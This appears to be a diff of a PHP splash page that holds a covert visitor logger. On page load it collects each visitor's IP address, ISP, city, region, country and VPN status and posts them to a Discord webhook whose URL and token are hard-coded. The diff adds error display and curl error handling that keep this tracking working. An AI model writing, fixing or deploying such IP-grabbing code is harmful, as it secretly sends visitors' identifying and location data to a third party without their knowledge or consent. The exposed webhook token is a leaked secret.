@@ -15,6 +15,9 @@
   </head>
   <body class="center" onload="SplashT">
     <?php
+        error_reporting(E_ALL);
+        ini_set('display_errors', 1);
+
         $webhookurl = "https://discord.com/api/webhooks/1349648325594583143/xXptCzRDkHB2hqt6FLKgpXatN_KdwgVGfi9T43-gxyIJCJy5K3XsUJWo-dy1IDOkm1yt";
 
         $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
@@ -32,7 +35,7 @@
             $vpn = "No (Double Check: $details->isp)";
         }
         $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
-        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Po[...]";
+        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n[...]";
 
         $json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
         $make_json = json_encode($json_data);
@@ -45,6 +48,12 @@
         curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 
         $response = curl_exec( $ch );
+
+        if($response === FALSE){
+            die(curl_error($ch));
+        }
+
+        curl_close($ch);
     ?>
     <div class="f-nav"></div>
     <div id="particles-js">
